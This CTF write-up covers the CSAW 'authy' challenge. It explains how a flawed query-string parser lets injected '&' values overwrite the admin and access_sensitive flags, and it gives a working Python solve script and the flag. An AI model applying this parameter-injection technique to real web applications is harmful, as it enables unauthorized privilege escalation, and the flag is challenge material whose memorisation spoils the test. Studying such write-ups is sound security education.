# authy

Author: [roerohan](https://github.com/roerohan) and [thebongy](https://github.com/thebongy)

# Requirements

- Python

# Source

- [handout.py](./handout.py)

```
Check out this new storage application that your government has started! It's supposed to be pretty secure since everything is authenticated...

curl crypto.chal.csaw.io:5003
```

# Exploitation

This is possibly an probably solution. We do not use any crypto, just exploit the following lines of code:

```py
params = identifier.replace('&', ' ').split(" ")
note_dict = { param.split("=")[0]: param.split("=")[1]  for param in params }
```

We can make use of the replace `'&'` with `' '` by inserting `'&'`s in the values for the query params, so that the resultant strings turn out like the following.

```
admin=False&access_sensitive=False&author=&admin=True&access_sensitive=True&note=&entrynum=783
```

Here, we pass the value of `author` as `&admin=True&access_sensitive=True`, so that when the server replaces `'&'` by `' '`, the `admin` and the `access_sensitive` keys are overwritten.
<br />

There is one small problem, the `entrynum` is attached to the end of the string, hence can't be overwritten by using this technique. We can look into the `/new` route to find out why it's at the end.
<br />

In the `/new` route, the following code is executed:

```py
payload = flask.request.form.to_dict()
if "author" not in payload.keys():
    return ">:(\n"
if "note" not in payload.keys():
    return ">:(\n"

if "admin" in payload.keys():
    return ">:(\n>:(\n"
if "access_sensitive" in payload.keys():
    return ">:(\n>:(\n"

info = {"admin": "False", "access_sensitive": "False" }
info.update(payload)
info["entrynum"] = 783
```

The `entrynum` key is set at the end, hence it appears at the end. Therefore, if the request body already had a key called `entrynum` before `author`, it would show up before and could be overwritten by using the `&` strategy in `author` or `note`. The following script can be used to solve the challenge.

```py
import requests
import base64

local = False

url = lambda x: "http://crypto.chal.csaw.io:5003" + x

if local:
    url = lambda x: "http://localhost:5000" + x


def view(id, integrity):
    print(f"\n\nSending id={id}, integrity={integrity}\n\n")
    r = requests.post(
        url("/view"),
        data={
            "id": id,
            "integrity": integrity,
        },
    )

    print("\n\n")
    print(r.text)
    return r.text


data = {
    "entrynum": 7,
    "author": "&admin=True",
    "note": "&access_sensitive=True&entrynum=7",
}

r = requests.post(url("/new"), data=data)

encoded, hexdigest = r.text.strip().split(":")
encoded = encoded.split('Successfully added ')[1]

print("Encoded: " + encoded)
print("Hexdigest: " + hexdigest)

flag = view(encoded, hexdigest)
```

The flag is:

```
flag{h4ck_th3_h4sh}
```
